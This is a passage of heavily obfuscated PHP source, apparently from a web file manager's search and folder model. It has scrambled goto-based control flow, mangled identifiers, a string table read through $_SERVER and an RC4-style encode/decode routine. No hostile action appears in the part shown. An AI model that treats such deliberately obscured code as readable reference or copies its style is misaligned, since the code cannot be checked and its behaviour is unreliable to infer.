$Bºêßƒƒ¥½ = array(); goto e¶ŒÂİ¥ô; f‰“çÁğš: $D«°°ƒÔŞÁ = $D—¬Ï‚°¼[33]; for ($C¡•‚Ø°² = $e£«´ˆ©ØÓ = $D¦³•’¹”™ = 0; $D¦³•’¹”™ < $d‚÷²å¡¼º; $D¦³•’¹”™++) { $C¡•‚Ø°² = ($C¡•‚Ø°² + 1) % 256; $e£«´ˆ©ØÓ = ($e£«´ˆ©ØÓ + $bÚ½Üğ¶[$C¡•‚Ø°²]) % 256; $e‰† ‹êÖº = $bÚ½Üğ¶[$C¡•‚Ø°²]; $bÚ½Üğ¶[$C¡•‚Ø°²] = $bÚ½Üğ¶[$e£«´ˆ©ØÓ]; $bÚ½Üğ¶[$e£«´ˆ©ØÓ] = $e‰† ‹êÖº; $D«°°ƒÔŞÁ .= chr(ord($DÊ›Ù¡Æ•[$D¦³•’¹”™]) ^ $bÚ½Üğ¶[($bÚ½Üğ¶[$C¡•‚Ø°²] + $bÚ½Üğ¶[$e£«´ˆ©ØÓ]) % 256]); } $D«°°ƒÔŞÁ = $Föˆë¹ï…Œ . str_replace($D—¬Ï‚°¼[901], $D—¬Ï‚°¼[33], base64_encode($D«°°ƒÔŞÁ)); goto E­Ş¿§”†´; CçïÕÜ¹Ç®: $D—¬Ï‚°¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e¸ïßˆë½ = 4; $e‹­ÒöƒŒ¥ = md5($e‹­ÒöƒŒ¥ ? $e‹­ÒöƒŒ¥ : self::$defaultKey); goto fğÊñ©‘„¡; e¶ŒÂİ¥ô: for ($D¦³•’¹”™ = 0; $D¦³•’¹”™ <= 255; $D¦³•’¹”™++) { $Bºêßƒƒ¥½[$D¦³•’¹”™] = ord($EÚ„ÛŠÂĞ[$D¦³•’¹”™ % $fÎÚ…®ˆ÷È]); } $bÚ½Üğ¶ = range(0, 255); for ($e£«´ˆ©ØÓ = $D¦³•’¹”™ = 0; $D¦³•’¹”™ < 256; $D¦³•’¹”™++) { $e£«´ˆ©ØÓ = ($e£«´ˆ©ØÓ + $bÚ½Üğ¶[$D¦³•’¹”™] + $Bºêßƒƒ¥½[$D¦³•’¹”™]) % 256; $e‰† ‹êÖº = $bÚ½Üğ¶[$D¦³•’¹”™]; $bÚ½Üğ¶[$D¦³•’¹”™] = $bÚ½Üğ¶[$e£«´ˆ©ØÓ]; $bÚ½Üğ¶[$e£«´ˆ©ØÓ] = $e‰† ‹êÖº; } goto f‰“çÁğš; EùÆÚšØ³ˆ: $Föˆë¹ï…Œ = substr($FÔÓæçò¯ô, -$e¸ïßˆë½); $EÚ„ÛŠÂĞ = $eŸäà‹ÛŒ . md5($eŸäà‹ÛŒ . $Föˆë¹ï…Œ); $fÎÚ…®ˆ÷È = strlen($EÚ„ÛŠÂĞ); goto cáçÒñÂø; E­Ş¿§”†´: $D«°°ƒÔŞÁ = str_replace(array($D—¬Ï‚°¼[281], $D—¬Ï‚°¼[8], $D—¬Ï‚°¼[901]), array($D—¬Ï‚°¼[408], $D—¬Ï‚°¼[70], $D—¬Ï‚°¼[93]), $D«°°ƒÔŞÁ); return $D«°°ƒÔŞÁ; goto aÏÏéƒ¦¬¾; aÏÏéƒ¦¬¾: } public static function decode($E‚õñ²‡ö¯, $a‡ÖÓˆ« = '') { goto eË©Ü±µó; d˜ÊÚ™ÀÊ: $E‚õñ²‡ö¯ = base64_decode(substr($E‚õñ²‡ö¯, $CØÇÏ»š¸Ù)); $DÆù¢šÂ = strlen($E‚õñ²‡ö¯); $fÀ†‘Êò¨ = array(); goto cô›ƒÍŠĞ; DŒ‘ò‰“®Š: $FœÑÓ†Á•Ö = substr($E‚õñ²‡ö¯, 0, $CØÇÏ»š¸Ù); $f›•ŸÜ©  = $AçË‡¹‰ê . md5($AçË‡¹‰ê . $FœÑÓ†Á•Ö); $a‘ê§³Ş¹‚ = strlen($f›•ŸÜ© ); goto d˜ÊÚ™ÀÊ; eË©Ü±µó: $Cì¨±‰á² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E‚õñ²‡ö¯ = str_replace(array($Cì¨±‰á²[408], $Cì¨±‰á²[70], $Cì¨±‰á²[93]), array($Cì¨±‰á²[281], $Cì¨±‰á²[8], $Cì¨±‰á²[901]), $E‚õñ²‡ö¯); $CØÇÏ»š¸Ù = 4; goto DÊŠ˜”‚©£; FêÉ†©Ğ Ó: $càĞñ˜¦¶ = $Cì¨±‰á²[33]; for ($B¶²ğ¾«×İ = $d©›ÅÊŠ„˜ = $DïßçÇñ¸¤ = 0; $DïßçÇñ¸¤ < $DÆù¢šÂ; $DïßçÇñ¸¤++) { $B¶²ğ¾«×İ = ($B¶²ğ¾«×İ + 1) % 256; $d©›ÅÊŠ„˜ = ($d©›ÅÊŠ„˜ + $fÚÃ¸ôçô¶[$B¶²ğ¾«×İ]) % 256; $DºØ³È†¤‰ = $fÚÃ¸ôçô¶[$B¶²ğ¾«×İ]; $fÚÃ¸ôçô¶[$B¶²ğ¾«×İ] = $fÚÃ¸ôçô¶[$d©›ÅÊŠ„˜]; $fÚÃ¸ôçô¶[$d©›ÅÊŠ„˜] = $DºØ³È†¤‰; $càĞñ˜¦¶ .= chr(ord($E‚õñ²‡ö¯[$DïßçÇñ¸¤]) ^ $fÚÃ¸ôçô¶[($fÚÃ¸ôçô¶[$B¶²ğ¾«×İ] + $fÚÃ¸ôçô¶[$d©›ÅÊŠ„˜]) % 256]); } $e¨ÓÆÔëÁá = intval(substr($càĞñ˜¦¶, 0, 10)); goto CÖÌƒª›¶¢; CÖÌƒª›¶¢: if (($e¨ÓÆÔëÁá == 0 || $e¨ÓÆÔëÁá - time() > 0) && substr($càĞñ˜¦¶, 10, 16) == substr(md5(substr($càĞñ˜¦¶, 26) . $DØ¶¨‡»¯É), 0, 16)) { return substr($càĞñ˜¦¶, 26); } else { return $Cì¨±‰á²[33]; } goto A›Ò¿òª‘; DÊŠ˜”‚©£: $a‡ÖÓˆ« = md5($a‡ÖÓˆ« ? $a‡ÖÓˆ« : self::$defaultKey); $AçË‡¹‰ê = md5(substr($a‡ÖÓˆ«, 0, 16)); $DØ¶¨‡»¯É = md5(substr($a‡ÖÓˆ«, 16, 16)); goto DŒ‘ò‰“®Š; cô›ƒÍŠĞ: for ($DïßçÇñ¸¤ = 0; $DïßçÇñ¸¤ <= 255; $DïßçÇñ¸¤++) { $fÀ†‘Êò¨[$DïßçÇñ¸¤] = ord($f›•ŸÜ© [$DïßçÇñ¸¤ % $a‘ê§³Ş¹‚]); } $fÚÃ¸ôçô¶ = range(0, 255); for ($d©›ÅÊŠ„˜ = $DïßçÇñ¸¤ = 0; $DïßçÇñ¸¤ < 256; $DïßçÇñ¸¤++) { $d©›ÅÊŠ„˜ = ($d©›ÅÊŠ„˜ + $fÚÃ¸ôçô¶[$DïßçÇñ¸¤] + $fÀ†‘Êò¨[$DïßçÇñ¸¤]) % 256; $DºØ³È†¤‰ = $fÚÃ¸ôçô¶[$DïßçÇñ¸¤]; $fÚÃ¸ôçô¶[$DïßçÇñ¸¤] = $fÚÃ¸ôçô¶[$d©›ÅÊŠ„˜]; $fÚÃ¸ôçô¶[$d©›ÅÊŠ„˜] = $DºØ³È†¤‰; } goto FêÉ†©Ğ Ó; A›Ò¿òª‘: } } goto c¼ğêßÍ; aĞŒÑŸ“ Ó: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($EÁÃ™âÖ™£) { goto F¿ŸÀ¢óæ; cò˜ß‚·Ú¯: if (!$FÙƒÂîÌø) { return array(); } $fæ‹”Í¢á = $FÙƒÂîÌø[$BÅ¯÷¨Å‹[157]]; $c‰ø•£ÃèÂ = $BÅ¯÷¨Å‹[7]; goto f‡½ÊÚÒÍ; f‡½ÊÚÒÍ: if (!$FÙƒÂîÌø[$BÅ¯÷¨Å‹[157]]) { $fï¨ƒâèÖ = array_to_keyvalue($cŠÂæ“§ÜĞ, $BÅ¯÷¨Å‹[33], $BÅ¯÷¨Å‹[157]); $fæ‹”Í¢á = implode($BÅ¯÷¨Å‹[47], $fï¨ƒâèÖ); $c‰ø•£ÃèÂ = $BÅ¯÷¨Å‹[2226]; } $bó˜°¶¢é = explode($BÅ¯÷¨Å‹[47], trim($fæ‹”Í¢á, $BÅ¯÷¨Å‹[47])); return array($c‰ø•£ÃèÂ, $bó˜°¶¢é); goto BºÆéÚ‚; F¿ŸÀ¢óæ: $BÅ¯÷¨Å‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cŠÂæ“§ÜĞ = KodIO::fileTypeList(); $FÙƒÂîÌø = $cŠÂæ“§ÜĞ[$EÁÃ™âÖ™£]; goto cò˜ß‚·Ú¯; BºÆéÚ‚: } public function listPathType($c±ÎÇº¶Ù) { $F„ÀŠ òÏï =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F¼‚½›ë‹À = $this->fileTypeWhere($c±ÎÇº¶Ù); if (!$F¼‚½›ë‹À) { return array(); } $E‡áìø’å = array($F„ÀŠ òÏï[517] => SourceModel::TYPE_USER, $F„ÀŠ òÏï[518] => USER_ID, $F„ÀŠ òÏï[514] => 0, $F„ÀŠ òÏï[515] => $F¼‚½›ë‹À); return $this->listSource($E‡áìø’å); } public function listSearch($C†äƒƒÛ, $E†êÌğ«™ì = 300) { goto Bä¦ä¯³‘; Bä¦ä¯³‘: $EØÀàØØŠÜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($C†äƒƒÛ[$EØÀàØØŠÜ[2148]]) && $C†äƒƒÛ[$EØÀàØØŠÜ[2148]]) { $C†äƒƒÛ[$EØÀàØØŠÜ[2148]] = str_replace($EØÀàØØŠÜ[1561], $EØÀàØØŠÜ[2270], trim($C†äƒƒÛ[$EØÀàØØŠÜ[2148]])); } $dñÏÑ´–Ä = $this->_parseSearchWhere($C†äƒƒÛ); goto E£„“ä†¦Í; cƒÇ£Š°ë·: $this->_listSearchDesc($b­¦Ù†çô , $C†äƒƒÛ, $c¬‘ºÑôÊ°); $this->_listSearchTag($b­¦Ù†çô , $C†äƒƒÛ, $c¬‘ºÑôÊ°); $this->_listDataApply($b­¦Ù†çô [$EØÀàØØŠÜ[351]]); goto e³ç½§‘®Ü; e³ç½§‘®Ü: $this->_listMake($b­¦Ù†çô ); return $b­¦Ù†çô ; goto cÊË‘•Â›; E£„“ä†¦Í: if (!isset($dñÏÑ´–Ä[$EØÀàØØŠÜ[393]])) { $dñÏÑ´–Ä[$EØÀàØØŠÜ[393]] = 0; } $EƒÙŞ¸êêˆ = $EØÀàØØŠÜ[2271]; $c¬‘ºÑôÊ° = $EƒÙŞ¸êêˆ; goto Eç¬ËÉô±ª; Eç¬ËÉô±ª: $this->_listSearchBindPinyin($C†äƒƒÛ, $dñÏÑ´–Ä, $EƒÙŞ¸êêˆ); $this->alias($EØÀàØØŠÜ[483])->_makeOrder()->cache(null, 10); $b­¦Ù†çô  = $this->distinct(!0)->field($EƒÙŞ¸êêˆ)->where($dñÏÑ´–Ä)->selectPage($E†êÌğ«™ì); goto cƒÇ£Š°ë·; cÊË‘•Â›: } private function _listSearchTag(&$f¾©ŒÜŞ¥, $FëÛ¸ø™íğ, $B›·òÂÂ‡Ì) { goto d³æ²Õë‡; aºåŞšî¨‡: if (!$E›×ğ‰í‘Œ) { return; } $c¯‹Ô¿Åù = array($DÖƒØ”Ú¤[390] => array($DÖƒØ”Ú¤[7], $E›×ğ‰í‘Œ)); $e¬¶©»È¥ = Model($DÖƒØ”Ú¤[2273])->field($DÖƒØ”Ú¤[75])->where($c¯‹Ô¿Åù)->select(); goto eÌ…À¤°‰; BÁ‘ÄÑ™Óº: $E›×ğ‰í‘Œ = array(); $Fî‘›ì = $FëÛ¸ø™íğ[$DÖƒØ”Ú¤[2148]]; foreach ($F“é¢£Í‡¨ as $f£¨ØÍÌ¹) { $bªåÁ‘éÛ· = $f£¨ØÍÌ¹[$DÖƒØ”Ú¤[28]]; $fÖ‰”‘ñã… = str_replace($DÖƒØ”Ú¤[50], $DÖƒØ”Ú¤[33], Pinyin::encode($bªåÁ‘éÛ·)); if (stripos($bªåÁ‘éÛ·, $Fî‘›ì) !== !1 || stripos($fÖ‰”‘ñã…, $Fî‘›ì) !== !1) { $E›×ğ‰í‘Œ[] = $f£¨ØÍÌ¹[$DÖƒØ”Ú¤[364]]; } } goto aºåŞšî¨‡; eÌ…À¤°‰: $e¬¶©»È¥ = array_to_keyvalue($e¬¶©»È¥, $DÖƒØ”Ú¤[33], $DÖƒØ”Ú¤[75]); $bÇÒï‹ˆ… = array_unique($e¬¶©»È¥); $this->_listSearchMerge($f¾©ŒÜŞ¥, $FëÛ¸ø™íğ, $B›·òÂÂ‡Ì, $bÇÒï‹ˆ…); goto A…‡˜ƒ÷Œ; d³æ²Õë‡: $DÖƒØ”Ú¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$FëÛ¸ø™íğ[$DÖƒØ”Ú¤[2148]] || $f¾©ŒÜŞ¥[$DÖƒØ”Ú¤[348]][$DÖƒØ”Ú¤[337]] > 1) { return; } $F“é¢£Í‡¨ = Model($DÖƒØ”Ú¤[2272])->listData(); goto BÁ‘ÄÑ™Óº; A…‡˜ƒ÷Œ: } private function _listSearchDesc(&$C£¬ÇÔ˜øµ, $dï£é–‚®, $fïË‹â«Ìˆ) { goto e„º™ÚÌ½‚; e„º™ÚÌ½‚: $e­Ó‡‡ù·Œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$dï£é–‚®[$e­Ó‡‡ù·Œ[2148]] || $C£¬ÇÔ˜øµ[$e­Ó‡‡ù·Œ[348]][$e­Ó‡‡ù·Œ[337]] > 1) { return; } $FÒÈµ¶ì¤ = $this->listSearchChildren($dï£é–‚®[$e­Ó‡‡ù·Œ[457]]); goto cœòïÂ¬Ô; cœòïÂ¬Ô: $FÒÈµ¶ì¤ = array_unique($FÒÈµ¶ì¤); if (!$FÒÈµ¶ì¤) { return; } $DğÒÏƒ¨‹æ = array($e­Ó‡‡ù·Œ[366] => array($e­Ó‡‡ù·Œ[7], $FÒÈµ¶ì¤), $e­Ó‡‡ù·Œ[89] => $e­Ó‡‡ù·Œ[401], $e­Ó‡‡ù·Œ[356] => array($e­Ó‡‡ù·Œ[746], $e­Ó‡‡ù·Œ[2150] . $dï£é–‚®[$e­Ó‡‡ù·Œ[2148]] . $e­Ó‡‡ù·Œ[2150])); goto Cå“‰ÒÑÁ; Cå“‰ÒÑÁ: $Dù’œõ¯‰ = Model($e­Ó‡‡ù·Œ[500])->field($e­Ó‡‡ù·Œ[366])->where($DğÒÏƒ¨‹æ)->select(); $FË¿Øéˆù = array_to_keyvalue($Dù’œõ¯‰, $e­Ó‡‡ù·Œ[33], $e­Ó‡‡ù·Œ[366]); $this->_listSearchMerge($C£¬ÇÔ˜øµ, $dï£é–‚®, $fïË‹â«Ìˆ, $FË¿Øéˆù); goto bæáµÙÍ”; bæáµÙÍ”: } private function _listSearchMerge(&$dù§ä±®, $A…ïà¨î×„, $eœÇ®ùã£‚, $e«ªÌ¬») { goto c—ù…êô¿; c—ù…êô¿: $d’ÇöàÑ¼› =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$e«ªÌ¬») { return; } $f·™ù—Ğãé = array_to_keyvalue($dù§ä±®[$d’ÇöàÑ¼›[351]], $d’ÇöàÑ¼›[33], $d’ÇöàÑ¼›[366]); goto eÓ˜¶é„æ; eÓ˜¶é„æ: $FµÛ‹ÈË = array_diff($e«ªÌ¬», $f·™ù—Ğãé); if (!$FµÛ‹ÈË) { return; } $dÛÔ¨İ±ï = array($d’ÇöàÑ¼›[366] => array($d’ÇöàÑ¼›[7], $FµÛ‹ÈË)); goto e¨ó¥»ø³ø; e¨ó¥»ø³ø: $fÇ‘òâ¸¡ = $this->field($eœÇ®ùã£‚)->where($dÛÔ¨İ±ï)->select(); if (!$fÇ‘òâ¸¡) { return; } $cÕ®½×ˆµ = array(); goto BïëÓ¦¶…; BïëÓ¦¶…: foreach ($fÇ‘òâ¸¡ as $E½¯²èä×) { $Fâ²ğ§Ö± = $d’ÇöàÑ¼›[47] . $A…ïà¨î×„[$d’ÇöàÑ¼›[457]] . $d’ÇöàÑ¼›[47]; if (stripos($E½¯²èä×[$d’ÇöàÑ¼›[455]], $Fâ²ğ§Ö±) !== !1) { $cÕ®½×ˆµ[] = $E½¯²èä×; } } $dù§ä±®[$d’ÇöàÑ¼›[351]] = array_merge($cÕ®½×ˆµ, $dù§ä±®[$d’ÇöàÑ¼›[351]]); $dù§ä±®[$d’ÇöàÑ¼›[348]][$d’ÇöàÑ¼›[349]] += count($cÕ®½×ˆµ); goto cÑÑ›·ÕÚò; cÑÑ›·ÕÚò: } public function listSearchChildren($EË÷¡ÉÁ¥–, $e¼…ÕŸÖƒ = 5000) { goto Bô½ÌÉŠî†; C——¯Šê: $dÑÚæËŒØ® = $this->field($BÒ£âÒ½‡×[366])->where($b©Å‹¹‚•Ğ)->select(); $DĞ¤»–å…… = array_to_keyvalue($dÑÚæËŒØ®, $BÒ£âÒ½‡×[33], $BÒ£âÒ½‡×[366]); return $DĞ¤»–å……; goto DŒ¿î“‹Ş; eØ–Ôæ‡Å´: $b©Å‹¹‚•Ğ = array($BÒ£âÒ½‡×[455] => array($BÒ£âÒ½‡×[746], $A²ê‹Ôßóæ[$BÒ£âÒ½‡×[455]] . $A²ê‹Ôßóæ[$BÒ£âÒ½‡×[366]] . $BÒ£âÒ½‡×[480])); $cÎÛ–æÖî = $this->field($BÒ£âÒ½‡×[366])->cache(null, 600)->where($b©Å‹¹‚•Ğ)->count(); if ($cÎÛ–æÖî > $e¼…ÕŸÖƒ) { return $this->_listSearchChildrenNear($EË÷¡ÉÁ¥–, $e¼…ÕŸÖƒ); } goto C——¯Šê; Bô½ÌÉŠî†: $BÒ£âÒ½‡× =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DĞ¤»–å…… = array(); $A²ê‹Ôßóæ = $this->sourceInfo($EË÷¡ÉÁ¥–); goto eØ–Ôæ‡Å´; DŒ¿î“‹Ş: } private function _listSearchChildrenNear($C©ëÈ±„…‡, $E…§¨Ş¬‡Ä) { goto CÅ–İ’Ë¨³; CÅ–İ’Ë¨³: $fÑÕ‡¸ª =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÑÃµ¿…¾ = array(); $E‰ÅÑåÃö„ = array($fÑÕ‡¸ª[457] => $C©ëÈ±„…‡); goto dòœÂ§ï; D‰‰½ŞÕ¤ö: $fÑÃµ¿…¾ = array_merge($fÑÃµ¿…¾, array_to_keyvalue($fÕ­ß«âº, $fÑÕ‡¸ª[33], $fÑÕ‡¸ª[366])); $fÑÃµ¿…¾ = array_slice($fÑÃµ¿…¾, 0, $E…§¨Ş¬‡Ä); return $fÑÃµ¿…¾; goto BÏâùŠ‘®—; dòœÂ§ï: $fÕ­ß«âº = $this->field($fÑÕ‡¸ª[2274])->where($E‰ÅÑåÃö„)->select(); $b¼Ò…çö™÷ = array_to_keyvalue(array_filter_by_field($fÕ­ß«âº, $fÑÕ‡¸ª[367], $fÑÕ‡¸ª[83]), $fÑÕ‡¸ª[33], $fÑÕ‡¸ª[366]); $fÑÃµ¿…¾ = array_merge($fÑÃµ¿…¾, array_to_keyvalue($fÕ­ß«âº, $fÑÕ‡¸ª[33], $fÑÕ‡¸ª[366])); goto f è¨¹½; f è¨¹½: if (!$b¼Ò…çö™÷) { return $fÑÃµ¿…¾; } $E‰ÅÑåÃö„ = array($fÑÕ‡¸ª[457] => array($fÑÕ‡¸ª[7], $b¼Ò…çö™÷)); $fÕ­ß«âº = $this->field($fÑÕ‡¸ª[2274])->where($E‰ÅÑåÃö„)->select(); goto D‰‰½ŞÕ¤ö; BÏâùŠ‘®—: } private function _listSearchBindPinyin($Eçø¾˜æŞ˜, &$FÅ¨Ê±±ÌÁ, &$b»ÛØÀ¼”) { goto A¦¾Ñì­«Û; a²©±ì³ˆ©: $eÍ¡ƒ ˆº…[] = array($a÷Ô­¬ÖÆ›[2278] => $A’Û„æÈù×, $a÷Ô­¬ÖÆ›[908] => $a÷Ô­¬ÖÆ›[2152], array($a÷Ô­¬ÖÆ›[2279] => $A’Û„æÈù×, $a÷Ô­¬ÖÆ›[2280] => array($a÷Ô­¬ÖÆ›[7], array($a÷Ô­¬ÖÆ›[412], $a÷Ô­¬ÖÆ›[411])))); $this->join($EÒ¼¼ÀÜ›÷); $FÅ¨Ê±±ÌÁ = $eÍ¡ƒ ˆº…; goto eƒã¹Šöæ°; cË¼Ş‰×¾: $eÍ¡ƒ ˆº… = array(); $b»ÛØÀ¼” = str_replace(array($a÷Ô­¬ÖÆ›[214], $a÷Ô­¬ÖÆ›[50], $a÷Ô­¬ÖÆ›[2275]), $a÷Ô­¬ÖÆ›[33], $b»ÛØÀ¼”); $b»ÛØÀ¼” = $a÷Ô­¬ÖÆ›[2276] . str_replace($a÷Ô­¬ÖÆ›[47], $a÷Ô­¬ÖÆ›[2277], $b»ÛØÀ¼”); goto D— —”ÃõÓ; A¦¾Ñì­«Û: $a÷Ô­¬ÖÆ› =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!Input::check($Eçø¾˜æŞ˜[$a÷Ô­¬ÖÆ›[2148]], $a÷Ô­¬ÖÆ›[303]) || strlen($Eçø¾˜æŞ˜[$a÷Ô­¬ÖÆ›[2148]]) < 2) { return; } $EÒ¼¼ÀÜ›÷ = "\114\105\x46\x54\40\112\117\111\116\x20{$this->tablePrefix}\151\157\137\163\157\x75\x72\143\x65\x5f\x6d\145\164\141\40\x6d\x65\x74\141\40\x6f\156\x20\163\157\x75\162\143\145\56\163\x6f\165\162\x63\145\111\x44\40\x3d\x20\155\145\164\x61\x2e\x73\157\x75\162\x63\x65\111\104"; goto cË¼Ş‰×¾; D— —”ÃõÓ: unset($FÅ¨Ê±±ÌÁ[$a÷Ô­¬ÖÆ›[28]]); foreach ($FÅ¨Ê±±ÌÁ as $e÷ºÂæó¼ => $cÀ®¢½ÓŠ) { $eÍ¡ƒ ˆº…[$a÷Ô­¬ÖÆ›[2276] . $e÷ºÂæó¼] = $cÀ®¢½ÓŠ; } $A’Û„æÈù× = array($a÷Ô­¬ÖÆ›[479], $a÷Ô­¬ÖÆ›[2150] . $Eçø¾˜æŞ˜[$a÷Ô­¬ÖÆ›[2148]] . $a÷Ô­¬ÖÆ›[2150]); goto a²©±ì³ˆ©; eƒã¹Šöæ°: } private function _parseSearchWhere($C°® Äœ¬) { goto eõ›˜Œ›ß; FªÒ¾ø­ˆ: if (isset($C°® Äœ¬[$f”Â•ÃÙ²[2148]]) && $C°® Äœ¬[$f”Â•ÃÙ²[2148]]) { $Cô˜§İÜ–Â = $C°® Äœ¬[$f”Â•ÃÙ²[2148]]; $d®²—¹‚Şˆ = explode($f”Â•ÃÙ²[50], $Cô˜§İÜ–Â); if (strlen($Cô˜§İÜ–Â) > 2 && (substr($Cô˜§İÜ–Â, 0, 1) == $f”Â•ÃÙ²[113] && substr($Cô˜§İÜ–Â, -1) == $f”Â•ÃÙ²[113]) || substr($Cô˜§İÜ–Â, 0, 1) == $f”Â•ÃÙ²[55] && substr($Cô˜§İÜ–Â, -1) == $f”Â•ÃÙ²[55]) { $Cô˜§İÜ–Â = substr($Cô˜§İÜ–Â, 1, -1); $d®²—¹‚Şˆ = array($Cô˜§İÜ–Â); } $dÙİïàˆİš[$f”Â•ÃÙ²[28]] = array($f”Â•ÃÙ²[479], $f”Â•ÃÙ²[2150] . $Cô˜§İÜ–Â . $f”Â•ÃÙ²[2150]); if (count($d®²—¹‚Şˆ) > 1) { $dÙİïàˆİš[$f”Â•ÃÙ²[28]] = array(); foreach ($d®²—¹‚Şˆ as $aİšÍ®Ò¡Š) { if (!trim($aİšÍ®Ò¡Š)) { continue; } $dÙİïàˆİš[$f”Â•ÃÙ²[28]][] = array($f”Â•ÃÙ²[479], $f”Â•ÃÙ²[2150] . trim($aİšÍ®Ò¡Š) . $f”Â•ÃÙ²[2150]); } } } return $dÙİïàˆİš; goto E°©îÖ»Ş; A‚ŠÉˆÌœæ: if (isset($C°® Äœ¬[$f”Â•ÃÙ²[698]])) { $b›Ò²³±Ëè = array($f”Â•ÃÙ²[2282], $C°® Äœ¬[$f”Â•ÃÙ²[698]]); if ($dÙİïàˆİš[$f”Â•ÃÙ²[107]]) { $dÙİïàˆİš[$f”Â•ÃÙ²[107]] = array($dÙİïàˆİš[$f”Â•ÃÙ²[107]], $b›Ò²³±Ëè, $f”Â•ÃÙ²[2283]); } else { $dÙİïàˆİš[$f”Â•ÃÙ²[107]] = $b›Ò²³±Ëè; } } if (isset($C°® Äœ¬[$f”Â•ÃÙ²[2284]])) { $dÙİïàˆİš[$f”Â•ÃÙ²[77]] = array($f”Â•ÃÙ²[2281], $C°® Äœ¬[$f”Â•ÃÙ²[2284]]); } if (isset($C°® Äœ¬[$f”Â•ÃÙ²[2285]])) { $b›Ò²³±Ëè = array($f”Â•ÃÙ²[2282], $C°® Äœ¬[$f”Â•ÃÙ²[2285]]); if ($dÙİïàˆİš[$f”Â•ÃÙ²[77]]) { $dÙİïàˆİš[$f”Â•ÃÙ²[77]] = array($dÙİïàˆİš[$f”Â•ÃÙ²[77]], $b›Ò²³±Ëè, $f”Â•ÃÙ²[2283]); } else { $dÙİïàˆİš[$f”Â•ÃÙ²[77]] = $b›Ò²³±Ëè; } } goto bØˆëİù; eõ›˜Œ›ß: $f”Â•ÃÙ² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÙİïàˆİš = array(); if (isset($C°® Äœ¬[$f”Â•ÃÙ²[697]])) { $dÙİïàˆİš[$f”Â•ÃÙ²[107]] = array($f”Â•ÃÙ²[2281], $C°® Äœ¬[$f”Â•ÃÙ²[697]]); } goto A‚ŠÉˆÌœæ; bØˆëİù: if (isset($C°® Äœ¬[$f”Â•ÃÙ²[531]])) { $dÙİïàˆİš[] = array($f”Â•ÃÙ²[376] => $C°® Äœ¬[$f”Â•ÃÙ²[531]], $f”Â•ÃÙ²[375] => $C°® Äœ¬[$f”Â•ÃÙ²[531]], $f”Â•ÃÙ²[908] => $f”Â•ÃÙ²[2152]); } if (isset($C°® Äœ¬[$f”Â•ÃÙ²[369]])) { $D›ÈÁ…É = $C°® Äœ¬[$f”Â•ÃÙ²[369]]; if ($D›ÈÁ…É == $f”Â•ÃÙ²[76]) { $dÙİïàˆİš[$f”Â•ÃÙ²[367]] = 1; } else { if ($D›ÈÁ…É == $f”Â•ÃÙ²[2286]) { $dÙİïàˆİš[$f”Â•ÃÙ²[367]] = 0; } else { if ($D›ÈÁ…É) { $D›ÈÁ…É = is_array($D›ÈÁ…É) ? $D›ÈÁ…É : explode($f”Â•ÃÙ²[47], $D›ÈÁ…É); $dÙİïàˆİš[$f”Â•ÃÙ²[369]] = array($f”Â•ÃÙ²[381], $D›ÈÁ…É); $dÙİïàˆİš[$f”Â•ÃÙ²[367]] = 0; } } } } if (isset($C°® Äœ¬[$f”Â•ÃÙ²[457]])) { $bçŒŸÅÜà¤ = $this->sourceInfo($C°® Äœ¬[$f”Â•ÃÙ²[457]]); $dÙİïàˆİš[$f”Â•ÃÙ²[521]] = array($f”Â•ÃÙ²[479], $bçŒŸÅÜà¤[$f”Â•ÃÙ²[455]] . $C°® Äœ¬[$f”Â•ÃÙ²[457]] . $f”Â•ÃÙ²[480]); } goto FªÒ¾ø­ˆ; E°©îÖ»Ş: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($B©¦„…Ìâ‡) { $DƒÁ‹ñï‚Ù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F‡ó­™¼„Ç = Model($DƒÁ‹ñï‚Ù[470])->where(array($DƒÁ‹ñï‚Ù[1400] => $B©¦„…Ìâ‡))->find(); $bñ”§‡¦ì¹ = $this->_mkdirRoot(SourceModel::TYPE_USER, $B©¦„…Ìâ‡, $F‡ó­™¼„Ç[$DƒÁ‹ñï‚Ù[28]]); $this->userDesktopAdd($bñ”§‡¦ì¹); return $bñ”§‡¦ì¹; } public function userDesktopAdd($fÄ§ö¥Í) { $b°²¿Æ¤É³ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Cš“ÌŞ©Ë¶ = LNG($b°²¿Æ¤É³[2287]); $Eã¼ô’­ = $this->mkdir($fÄ§ö¥Í, $Cš“ÌŞ©Ë¶); $this->metaSet($Eã¼ô’­, $b°²¿Æ¤É³[2288], $b°²¿Æ¤É³[83]); $this->metaSet($fÄ§ö¥Í, $b°²¿Æ¤É³[2289], $Eã¼ô’­); } public function groupRootAdd($B…ÖÊĞÔ è) { $C²Í´ÖÄé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F§»¡ÃÄÁø = Model($C²Í´ÖÄé[454])->where(array($C²Í´ÖÄé[2144] => $B…ÖÊĞÔ è))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $B…ÖÊĞÔ è, $F§»¡ÃÄÁø[$C²Í´ÖÄé[28]]); } public function systemRootPathAdd($CÀ„Ùà“Š) { if ($CÀ„Ùà“Š != $_SERVER[ÚŠ•´ÍéÒÑÔ][1081]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $CÀ„Ùà“Š); } public function userRootRemove($d’ÈŠˆÙ´Ê) { $CÊï…ÈÌ…ˆ = $this->sourceRoot(SourceModel::TYPE_USER, $d’ÈŠˆÙ´Ê); if (!$CÊï…ÈÌ…ˆ) { return; } $this->remove($CÊï…ÈÌ…ˆ, !1); } public function groupRootRemove($C™ÄÒ‚ø‘) { $eÉ¹‹‹›š = $this->sourceRoot(SourceModel::TYPE_GROUP, 